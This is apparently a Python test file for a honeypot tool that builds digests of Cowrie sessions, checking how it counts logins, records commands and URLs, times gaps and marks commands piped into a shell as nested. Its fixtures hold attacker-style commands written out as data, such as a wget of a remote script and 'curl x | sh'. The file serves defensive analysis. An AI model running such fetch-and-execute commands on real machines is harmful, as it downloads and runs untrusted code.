from vulnmaze.digest.builder import apply, build, new_digest, public_view


def _ev(eventid, second, **fields):
    """A normalised event at the given second of the session."""
    return {"eventid": eventid, "session": "s1", "ts": f"2026-10-01T00:00:{second:02d}+00:00", **fields}


EVENTS = [
    _ev("cowrie.session.connect", 0, src_ip_hmac="abc", src_prefix="198.51.0.0/16"),
    _ev("cowrie.login.failed", 1, username="root", password_hmac="p1", password_len=4),
    _ev("cowrie.login.success", 2, username="root", password_hmac="p2", password_len=6),
    _ev("cowrie.command.input", 4, input="uname -a"),
    _ev("cowrie.command.input", 10, input="wget http://198.51.100.1/x.sh"),
    _ev("cowrie.command.failed", 10),
    _ev("cowrie.session.closed", 12, duration_ms=12000),
]


def test_digest_summarises_a_session():
    """Logins, commands, failures, URLs, timing and closure are all captured."""
    d = build(EVENTS, "live", "s1")
    assert d["logins"]["n_failed"] == 1 and d["logins"]["n_success"] == 1 and d["logins"]["username"] == "root"
    assert [c["input"] for c in d["commands"]] == ["uname -a", "wget http://198.51.100.1/x.sh"]
    assert d["commands"][1]["failed"] and not d["commands"][0]["failed"]
    assert d["urls"] == ["http://198.51.100.1/x.sh"]
    assert d["timing"]["login_to_first_cmd_s"] == 2.0 and d["timing"]["gaps_s"] == [6.0]
    assert d["closed"] and d["duration_s"] == 12.0 and d["src_prefix"] == "198.51.0.0/16"


def test_apply_is_pure_unless_inplace():
    """apply leaves its input untouched by default, so digests can be rebuilt deterministically."""
    d = new_digest("live", "s1")
    out = apply(d, EVENTS[0])
    assert d["counts"]["events"] == 0 and out["counts"]["events"] == 1
    assert build(EVENTS, "live", "s1") == build(EVENTS, "live", "s1")


def test_piped_shell_commands_are_nested_not_typed():
    """Commands arriving within the subshell window after `| sh` are marked nested and excluded from timing."""
    events = [
        _ev("cowrie.login.success", 0, username="root"),
        _ev("cowrie.command.input", 1, input="curl x | sh"),
        _ev("cowrie.vulnmaze.route", 1, route="deterministic", command="sh"),
        _ev("cowrie.command.input", 1, input="id"),
    ]
    d = build(events, "live", "s1")
    assert d["commands"][1].get("nested") and d["counts"]["nested_commands"] == 1
    assert d["timing"]["gaps_s"] == [] and d["routes"]["deterministic"] == 1


def test_public_view_hides_internal_state():
    """The export view drops underscore-prefixed bookkeeping."""
    assert "_state" not in public_view(new_digest("live", "s1"))
